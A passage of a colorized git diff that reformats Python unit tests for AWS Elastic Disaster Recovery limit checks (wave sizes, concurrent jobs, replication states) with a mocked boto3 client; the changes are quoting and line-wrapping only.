DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['WARNING_REPLICATING_THRESHOLD'] < DRS_LIMITS['MAX_REPLICATING_SERVERS']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            DRS_LIMITS[\"WARNING_REPLICATING_THRESHOLD\"]\u001b[0m\n\u001b[32m+            < DRS_LIMITS[\"MAX_REPLICATING_SERVERS\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_critical_threshold_between_warning_and_max(self):\n         \"\"\"CRITICAL_REPLICATING_THRESHOLD should be between WARNING and MAX.\"\"\"\n         from index import DRS_LIMITS\n\u001b[31m-        assert DRS_LIMITS['CRITICAL_REPLICATING_THRESHOLD'] > DRS_LIMITS['WARNING_REPLICATING_THRESHOLD']\u001b[0m\n\u001b[31m-        assert DRS_LIMITS['CRITICAL_REPLICATING_THRESHOLD'] < DRS_LIMITS['MAX_REPLICATING_SERVERS']\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            DRS_LIMITS[\"CRITICAL_REPLICATING_THRESHOLD\"]\u001b[0m\n\u001b[32m+            > DRS_LIMITS[\"WARNING_REPLICATING_THRESHOLD\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        assert (\u001b[0m\n\u001b[32m+            DRS_LIMITS[\"CRITICAL_REPLICATING_THRESHOLD\"]\u001b[0m\n\u001b[32m+            < DRS_LIMITS[\"MAX_REPLICATING_SERVERS\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n \n \n class TestValidateWaveSizes:\n     \"\"\"Test validate_wave_sizes function.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_valid_wave_single_server(self):\n         \"\"\"Wave with 1 server should be valid.\"\"\"\n         from index import validate_wave_sizes\n\u001b[31m-        plan = {\u001b[0m\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 1', 'ServerIds': ['s-123']}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        plan = {\"Waves\": [{\"WaveName\": \"Wave 1\", \"ServerIds\": [\"s-123\"]}]}\u001b[0m\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_valid_wave_at_limit(self):\n         \"\"\"Wave with exactly 100 servers should be valid.\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 1', 'ServerIds': [f's-{i}' for i in range(100)]}\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(100)],\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         }\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_invalid_wave_over_limit(self):\n         \"\"\"Wave with 101 servers should return error.\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 1', 'ServerIds': [f's-{i}' for i in range(101)]}\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(101)],\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         }\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 1\n\u001b[31m-        assert errors[0]['type'] == 'WAVE_SIZE_EXCEEDED'\u001b[0m\n\u001b[31m-        assert errors[0]['serverCount'] == 101\u001b[0m\n\u001b[31m-        assert errors[0]['limit'] == 100\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert errors[0][\"type\"] == \"WAVE_SIZE_EXCEEDED\"\u001b[0m\n\u001b[32m+        assert errors[0][\"serverCount\"] == 101\u001b[0m\n\u001b[32m+        assert errors[0][\"limit\"] == 100\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_invalid_wave_way_over_limit(self):\n         \"\"\"Wave with 200 servers should return error with correct count.\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Big Wave', 'ServerIds': [f's-{i}' for i in range(200)]}\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Big Wave\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(200)],\u001b[0m\n\u001b[32m+                }\u001b[0m\n             ]\n         }\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 1\n\u001b[31m-        assert errors[0]['serverCount'] == 200\u001b[0m\n\u001b[31m-        assert 'Big Wave' in errors[0]['message']\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert errors[0][\"serverCount\"] == 200\u001b[0m\n\u001b[32m+        assert \"Big Wave\" in errors[0][\"message\"]\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_multiple_waves_one_invalid(self):\n         \"\"\"Multiple waves with one exceeding limit should return one error.\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 1', 'ServerIds': [f's-{i}' for i in range(50)]},\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 2', 'ServerIds': [f's-{i}' for i in range(150)]},\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 3', 'ServerIds': [f's-{i}' for i in range(30)]}\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(50)],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 2\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(150)],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 3\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(30)],\u001b[0m\n\u001b[32m+                },\u001b[0m\n             ]\n         }\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 1\n\u001b[31m-        assert errors[0]['wave'] == 'Wave 2'\u001b[0m\n\u001b[31m-        assert errors[0]['waveIndex'] == 2\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+        assert errors[0][\"wave\"] == \"Wave 2\"\u001b[0m\n\u001b[32m+        assert errors[0][\"waveIndex\"] == 2\u001b[0m\n\u001b[32m+\u001b[0m\n     def test_multiple_waves_all_invalid(self):\n         \"\"\"Multiple waves all exceeding limit should return multiple errors.\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 1', 'ServerIds': [f's-{i}' for i in range(101)]},\u001b[0m\n\u001b[31m-                {'WaveName': 'Wave 2', 'ServerIds': [f's-{i}' for i in range(150)]}\u001b[0m\n\u001b[32m+            \"Waves\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 1\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(101)],\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"WaveName\": \"Wave 2\",\u001b[0m\n\u001b[32m+                    \"ServerIds\": [f\"s-{i}\" for i in range(150)],\u001b[0m\n\u001b[32m+                },\u001b[0m\n             ]\n         }\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 2\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_empty_wave(self):\n         \"\"\"Wave with no servers should be valid.\"\"\"\n         from index import validate_wave_sizes\n\u001b[31m-        plan = {\u001b[0m\n\u001b[31m-            'Waves': [\u001b[0m\n\u001b[31m-                {'WaveName': 'Empty Wave', 'ServerIds': []}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        plan = {\"Waves\": [{\"WaveName\": \"Empty Wave\", \"ServerIds\": []}]}\u001b[0m\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_no_waves(self):\n         \"\"\"Plan with no waves should be valid.\"\"\"\n         from index import validate_wave_sizes\n\u001b[31m-        plan = {'Waves': []}\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        plan = {\"Waves\": []}\u001b[0m\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 0\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def test_missing_waves_key(self):\n         \"\"\"Plan without Waves key should be valid (empty).\"\"\"\n         from index import validate_wave_sizes\n\u001b[32m+\u001b[0m\n         plan = {}\n         errors = validate_wave_sizes(plan)\n         assert len(errors) == 0\n \n \n class TestValidateConcurrentJobs:\n     \"\"\"Test validate_concurrent_jobs function with mocked DRS client.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_no_active_jobs(self, mock_boto_client):\n         \"\"\"Should be valid when no active jobs exist.\"\"\"\n         from index import validate_concurrent_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n\u001b[31m-        mock_paginator.paginate.return_value = [{'items': []}]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [{\"items\": []}]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_concurrent_jobs('us-east-1')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['currentJobs'] == 0\u001b[0m\n\u001b[31m-        assert result['availableSlots'] == 20\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_concurrent_jobs(\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"currentJobs\"] == 0\u001b[0m\n\u001b[32m+        assert result[\"availableSlots\"] == 20\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_some_active_jobs(self, mock_boto_client):\n         \"\"\"Should be valid when under limit.\"\"\"\n         from index import validate_concurrent_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n\u001b[31m-        mock_paginator.paginate.return_value = [{\u001b[0m\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {'jobID': 'job-1', 'status': 'PENDING', 'type': 'LAUNCH', 'participatingServers': []},\u001b[0m\n\u001b[31m-                {'jobID': 'job-2', 'status': 'STARTED', 'type': 'DRILL', 'participatingServers': []},\u001b[0m\n\u001b[31m-                {'jobID': 'job-3', 'status': 'COMPLETED', 'type': 'LAUNCH', 'participatingServers': []},  # Not active\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [\u001b[0m\n\u001b[32m+            {\u001b[0m\n\u001b[32m+                \"items\": [\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"jobID\": \"job-1\",\u001b[0m\n\u001b[32m+                        \"status\": \"PENDING\",\u001b[0m\n\u001b[32m+                        \"type\": \"LAUNCH\",\u001b[0m\n\u001b[32m+                        \"participatingServers\": [],\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"jobID\": \"job-2\",\u001b[0m\n\u001b[32m+                        \"status\": \"STARTED\",\u001b[0m\n\u001b[32m+                        \"type\": \"DRILL\",\u001b[0m\n\u001b[32m+                        \"participatingServers\": [],\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"jobID\": \"job-3\",\u001b[0m\n\u001b[32m+                        \"status\": \"COMPLETED\",\u001b[0m\n\u001b[32m+                        \"type\": \"LAUNCH\",\u001b[0m\n\u001b[32m+                        \"participatingServers\": [],\u001b[0m\n\u001b[32m+                    },  # Not active\u001b[0m\n\u001b[32m+                ]\u001b[0m\n\u001b[32m+            }\u001b[0m\n\u001b[32m+        ]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_concurrent_jobs('us-east-1')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['currentJobs'] == 2  # Only PENDING and STARTED\u001b[0m\n\u001b[31m-        assert result['availableSlots'] == 18\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_concurrent_jobs(\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"currentJobs\"] == 2  # Only PENDING and STARTED\u001b[0m\n\u001b[32m+        assert result[\"availableSlots\"] == 18\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_at_limit(self, mock_boto_client):\n         \"\"\"Should be invalid when at limit.\"\"\"\n         from index import validate_concurrent_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n         # Create 20 active jobs\n         active_jobs = [\n\u001b[31m-            {'jobID': f'job-{i}', 'status': 'STARTED', 'type': 'LAUNCH', 'participatingServers': []}\u001b[0m\n\u001b[32m+            {\u001b[0m\n\u001b[32m+                \"jobID\": f\"job-{i}\",\u001b[0m\n\u001b[32m+                \"status\": \"STARTED\",\u001b[0m\n\u001b[32m+                \"type\": \"LAUNCH\",\u001b[0m\n\u001b[32m+                \"participatingServers\": [],\u001b[0m\n\u001b[32m+            }\u001b[0m\n             for i in range(20)\n         ]\n\u001b[31m-        mock_paginator.paginate.return_value = [{'items': active_jobs}]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [{\"items\": active_jobs}]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_concurrent_jobs('us-east-1')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is False\u001b[0m\n\u001b[31m-        assert result['currentJobs'] == 20\u001b[0m\n\u001b[31m-        assert result['availableSlots'] == 0\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_concurrent_jobs(\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is False\u001b[0m\n\u001b[32m+        assert result[\"currentJobs\"] == 20\u001b[0m\n\u001b[32m+        assert result[\"availableSlots\"] == 0\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_api_error_returns_valid_with_warning(self, mock_boto_client):\n         \"\"\"Should return valid=True with warning on API error.\"\"\"\n         from index import validate_concurrent_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_drs.get_paginator.side_effect = Exception(\"API Error\")\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_concurrent_jobs('us-east-1')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert 'warning' in result\u001b[0m\n\u001b[31m-        assert result['currentJobs'] is None\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_concurrent_jobs(\"us-east-1\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert \"warning\" in result\u001b[0m\n\u001b[32m+        assert result[\"currentJobs\"] is None\u001b[0m\n \n \n class TestValidateServersInAllJobs:\n     \"\"\"Test validate_servers_in_all_jobs function with mocked DRS client.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_no_servers_in_jobs(self, mock_boto_client):\n         \"\"\"Should be valid when no servers in active jobs.\"\"\"\n         from index import validate_servers_in_all_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n\u001b[31m-        mock_paginator.paginate.return_value = [{'items': []}]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [{\"items\": []}]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_servers_in_all_jobs('us-east-1', 50)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['currentServersInJobs'] == 0\u001b[0m\n\u001b[31m-        assert result['totalAfterNew'] == 50\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_servers_in_all_jobs(\"us-east-1\", 50)\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"currentServersInJobs\"] == 0\u001b[0m\n\u001b[32m+        assert result[\"totalAfterNew\"] == 50\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_would_exceed_limit(self, mock_boto_client):\n         \"\"\"Should be invalid when adding servers would exceed 500 limit.\"\"\"\n         from index import validate_servers_in_all_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n         # 450 servers already in jobs\n\u001b[31m-        mock_paginator.paginate.return_value = [{\u001b[0m\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {'jobID': 'job-1', 'status': 'STARTED', 'participatingServers': [{'sourceServerID': f's-{i}'} for i in range(450)]}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [\u001b[0m\n\u001b[32m+            {\u001b[0m\n\u001b[32m+                \"items\": [\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"jobID\": \"job-1\",\u001b[0m\n\u001b[32m+                        \"status\": \"STARTED\",\u001b[0m\n\u001b[32m+                        \"participatingServers\": [\u001b[0m\n\u001b[32m+                            {\"sourceServerID\": f\"s-{i}\"} for i in range(450)\u001b[0m\n\u001b[32m+                        ],\u001b[0m\n\u001b[32m+                    }\u001b[0m\n\u001b[32m+                ]\u001b[0m\n\u001b[32m+            }\u001b[0m\n\u001b[32m+        ]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_servers_in_all_jobs('us-east-1', 100)  # Would be 550 total\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is False\u001b[0m\n\u001b[31m-        assert result['currentServersInJobs'] == 450\u001b[0m\n\u001b[31m-        assert result['totalAfterNew'] == 550\u001b[0m\n\u001b[31m-        assert result['maxServers'] == 500\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_servers_in_all_jobs(\u001b[0m\n\u001b[32m+            \"us-east-1\", 100\u001b[0m\n\u001b[32m+        )  # Would be 550 total\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is False\u001b[0m\n\u001b[32m+        assert result[\"currentServersInJobs\"] == 450\u001b[0m\n\u001b[32m+        assert result[\"totalAfterNew\"] == 550\u001b[0m\n\u001b[32m+        assert result[\"maxServers\"] == 500\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_exactly_at_limit(self, mock_boto_client):\n         \"\"\"Should be valid when exactly at 500 limit.\"\"\"\n         from index import validate_servers_in_all_jobs\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_paginator = MagicMock()\n\u001b[31m-        mock_paginator.paginate.return_value = [{\u001b[0m\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {'jobID': 'job-1', 'status': 'STARTED', 'participatingServers': [{'sourceServerID': f's-{i}'} for i in range(400)]}\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }]\u001b[0m\n\u001b[32m+        mock_paginator.paginate.return_value = [\u001b[0m\n\u001b[32m+            {\u001b[0m\n\u001b[32m+                \"items\": [\u001b[0m\n\u001b[32m+                    {\u001b[0m\n\u001b[32m+                        \"jobID\": \"job-1\",\u001b[0m\n\u001b[32m+                        \"status\": \"STARTED\",\u001b[0m\n\u001b[32m+                        \"participatingServers\": [\u001b[0m\n\u001b[32m+                            {\"sourceServerID\": f\"s-{i}\"} for i in range(400)\u001b[0m\n\u001b[32m+                        ],\u001b[0m\n\u001b[32m+                    }\u001b[0m\n\u001b[32m+                ]\u001b[0m\n\u001b[32m+            }\u001b[0m\n\u001b[32m+        ]\u001b[0m\n         mock_drs.get_paginator.return_value = mock_paginator\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_servers_in_all_jobs('us-east-1', 100)  # Exactly 500\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['totalAfterNew'] == 500\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_servers_in_all_jobs(\"us-east-1\", 100)  # Exactly 500\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"totalAfterNew\"] == 500\u001b[0m\n \n \n class TestValidateServerReplicationStates:\n     \"\"\"Test validate_server_replication_states function with mocked DRS client.\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_all_healthy_servers(self, mock_boto_client):\n         \"\"\"Should be valid when all servers have healthy replication.\"\"\"\n         from index import validate_server_replication_states\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_drs.describe_source_servers.return_value = {\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'sourceServerID': 's-1',\u001b[0m\n\u001b[31m-                    'dataReplicationInfo': {'dataReplicationState': 'CONTINUOUS_REPLICATION'},\u001b[0m\n\u001b[31m-                    'lifeCycle': {'state': 'READY_FOR_TEST'},\u001b[0m\n\u001b[31m-                    'sourceProperties': {'identificationHints': {'hostname': 'server1'}}\u001b[0m\n\u001b[31m-                },\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'sourceServerID': 's-2',\u001b[0m\n\u001b[31m-                    'dataReplicationInfo': {'dataReplicationState': 'CONTINUOUS_REPLICATION'},\u001b[0m\n\u001b[31m-                    'lifeCycle': {'state': 'READY_FOR_TEST'},\u001b[0m\n\u001b[31m-                    'sourceProperties': {'identificationHints': {'hostname': 'server2'}}\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[31m-            ]\u001b[0m\n\u001b[31m-        }\u001b[0m\n\u001b[31m-        mock_boto_client.return_value = mock_drs\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_server_replication_states('us-east-1', ['s-1', 's-2'])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is True\u001b[0m\n\u001b[31m-        assert result['healthyCount'] == 2\u001b[0m\n\u001b[31m-        assert result['unhealthyCount'] == 0\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[31m-    @patch('index.boto3.client')\u001b[0m\n\u001b[32m+            \"items\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-1\",\u001b[0m\n\u001b[32m+                    \"dataReplicationInfo\": {\u001b[0m\n\u001b[32m+                        \"dataReplicationState\": \"CONTINUOUS_REPLICATION\"\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    \"lifeCycle\": {\"state\": \"READY_FOR_TEST\"},\u001b[0m\n\u001b[32m+                    \"sourceProperties\": {\u001b[0m\n\u001b[32m+                        \"identificationHints\": {\"hostname\": \"server1\"}\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-2\",\u001b[0m\n\u001b[32m+                    \"dataReplicationInfo\": {\u001b[0m\n\u001b[32m+                        \"dataReplicationState\": \"CONTINUOUS_REPLICATION\"\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    \"lifeCycle\": {\"state\": \"READY_FOR_TEST\"},\u001b[0m\n\u001b[32m+                    \"sourceProperties\": {\u001b[0m\n\u001b[32m+                        \"identificationHints\": {\"hostname\": \"server2\"}\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                },\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+        }\u001b[0m\n\u001b[32m+        mock_boto_client.return_value = mock_drs\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        result = validate_server_replication_states(\u001b[0m\n\u001b[32m+            \"us-east-1\", [\"s-1\", \"s-2\"]\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        assert result[\"valid\"] is True\u001b[0m\n\u001b[32m+        assert result[\"healthyCount\"] == 2\u001b[0m\n\u001b[32m+        assert result[\"unhealthyCount\"] == 0\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+    @patch(\"index.boto3.client\")\u001b[0m\n     def test_disconnected_server(self, mock_boto_client):\n         \"\"\"Should be invalid when server is disconnected.\"\"\"\n         from index import validate_server_replication_states\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         mock_drs = MagicMock()\n         mock_drs.describe_source_servers.return_value = {\n\u001b[31m-            'items': [\u001b[0m\n\u001b[31m-                {\u001b[0m\n\u001b[31m-                    'sourceServerID': 's-1',\u001b[0m\n\u001b[31m-                    'dataReplicationInfo': {'dataReplicationState': 'DISCONNECTED'},\u001b[0m\n\u001b[31m-                    'lifeCycle': {'state': 'DISCONNECTED'},\u001b[0m\n\u001b[31m-                    'sourceProperties': {'identificationHints': {'hostname': 'server1'}}\u001b[0m\n\u001b[32m+            \"items\": [\u001b[0m\n\u001b[32m+                {\u001b[0m\n\u001b[32m+                    \"sourceServerID\": \"s-1\",\u001b[0m\n\u001b[32m+                    \"dataReplicationInfo\": {\u001b[0m\n\u001b[32m+                        \"dataReplicationState\": \"DISCONNECTED\"\u001b[0m\n\u001b[32m+                    },\u001b[0m\n\u001b[32m+                    \"lifeCycle\": {\"state\": \"DISCONNECTED\"},\u001b[0m\n\u001b[32m+                    \"sourceProperties\": {\u001b[0m\n\u001b[32m+                        \"identificationHints\": {\"hostname\": \"server1\"}\u001b[0m\n\u001b[32m+                    },\u001b[0m\n                 }\n             ]\n         }\n         mock_boto_client.return_value = mock_drs\n\u001b[31m-        \u001b[0m\n\u001b[31m-        result = validate_server_replication_states('us-east-1', ['s-1'])\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[31m-        assert result['valid'] is 